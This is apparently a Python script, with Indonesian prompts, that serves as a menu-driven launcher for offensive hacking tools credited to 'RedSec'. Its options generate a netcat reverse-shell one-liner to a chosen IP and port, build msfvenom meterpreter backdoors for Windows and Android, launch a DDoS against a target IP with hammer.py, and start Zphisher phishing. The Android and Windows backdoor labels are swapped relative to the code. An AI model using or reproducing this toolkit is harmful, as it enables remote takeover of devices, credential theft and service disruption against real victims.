import os
import sys
import time
os.system("clear")
print("""
        \033[1;31m /$$   /$$ /$$$$$$ /$$$$$$$$\033[0m     
        \033[1;31m| $$  /$$/|_  $$_/|__  $$__/\033[0m      
        \033[1;31m| $$ /$$/   | $$     | $$   \033[0m      
        \033[1;31m| $$$$$/    | $$     | $$   \033[0m     
        \033[1;31m| $$  $$    | $$     | $$   \033[0m      
        \033[1;31m| $$\  $$   | $$     | $$   \033[0m      
        \033[1;31m| $$ \  $$ /$$$$$$   | $$   \033[0m
        \033[1;31m|__/  \__/|______/   |__/   \033[0m
             \033[1;31mCreate By ./RedSec\033[0m
""")
while True:
    # Dapatkan pilihan dari pengguna
    pilihan = input("\033[1;31mMsec@root~# \033[0m")

    # Eksekusi perintah sesuai dengan pilihan
    if pilihan == "menu":
        print("""\033[1;32m 
        =====================
        |       Menu        |
        =====================
        clear : Clear Program 
        backdoor : Create Backdoor
        ddos : DDos Attack
        ping 1.1.1.1 : Ping Internet
        msfconsole : Open Metasploit
        ifconfig : Show ifconfig
        Auto Coding : Comming Soon
        phising : Phising With Zphisher
        netcat : Reverse Shell
        paramspider : Parameter Mining With ParamSpider
        sqlscan : Sql Scanning With SQL-scanner
        """)
    elif pilihan == "sqlscan":
        print("""\033[1;32m 
        =================================
        | Sql Scanning With Sql-scanner |
        =================================
        Run Tools
        """)
        os.system("sh s2.sh")
    elif pilihan == "paramspider":
        print("""\033[1;32m 
       =======================================
       |  Parameter Mining Wait ParamSpider  |
       =======================================
       Run Tools
       """)
        os.system("sh s1.sh")
    elif pilihan == "phising":
        print("""\033[1;32m 
       =========================
       | Phising With Zphisher |
       =========================
       Run Tools
       """)
        time.sleep(0)
        os.system("sh s.sh")
    elif pilihan == "netcat":
        print("""\033[1;32m 
        ==============
        |   NetCat   |
        ==============
        """)
        ip = input ("Masukan ip anda : ")
        port = input ("Port yang ingin di dengar : ")
        print (f"SHELL ANDA : rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
        os.system(f"nc -lnvp {port}")
    elif pilihan == "ifconfig":
        print("""\033[1;32m 
        ================
        |   IfConfig   |
        ================
        """)
        os.system("ifconfig")
        print("")
    elif pilihan == "msfconsole":
        print("""\033[1;32m 
        ==================
        |   Metasploit   |
        ==================
        """)
        os.system("msfconsole")
    elif pilihan == "ping 1.1.1.1":
        print("""\033[1;32m 
        ==================
        |  Ping 1.1.1.1  |
        ==================
        """)
        os.system("ping 1.1.1.1")
    elif pilihan == "ddos":
        print("""\033[1;32m 
        ==============
        |    DDos    |
        ==============
        """)
        ddos = input ("Masukan IP Target => ")
        os.system(f"python3 hammer.py -s {ddos} -p 80 -t 135")
    elif pilihan == "backdoor":
        print("""\033[1;32m 
        ==================
        |    BackDoor    |
        ==================
        [ back1 ] Backdoor Android
        [ back2 ] Backdoor Windows
        ==================
        """)
    elif pilihan == "back1":
        ip8 = input ("Masukan Local IP : ")
        port2 = input ("Masukan Port : ")
        win = input ("Masukan Nama File ( test.exe ) : ")
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip8} LPORT={port2} R > {win}")
        os.system("msfconsole")
    elif pilihan == "back2":
        ip6 = input ("Masukan Local IP : ")
        port1 = input ("Masukan Port : ")
        apk = input ("Masukan Nama File ( test.apk ) : ")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip6} LPORT={port1} R > {apk}")
        os.system("msfconsole")
    elif pilihan == "clear":
        os.system("clear")
        print("""
        \033[1;31m /$$   /$$ /$$$$$$ /$$$$$$$$\033[0m     
        \033[1;31m| $$  /$$/|_  $$_/|__  $$__/\033[0m      
        \033[1;31m| $$ /$$/   | $$     | $$   \033[0m      
        \033[1;31m| $$$$$/    | $$     | $$   \033[0m     
        \033[1;31m| $$  $$    | $$     | $$   \033[0m      
        \033[1;31m| $$\  $$   | $$     | $$   \033[0m      
        \033[1;31m| $$ \  $$ /$$$$$$   | $$   \033[0m
        \033[1;31m|__/  \__/|______/   |__/   \033[0m
             \033[1;31mCreate By ./RedSec\033[0m
""")
    elif pilihan == "exit":
        break
    else:
        print("Command Tidak Valid")
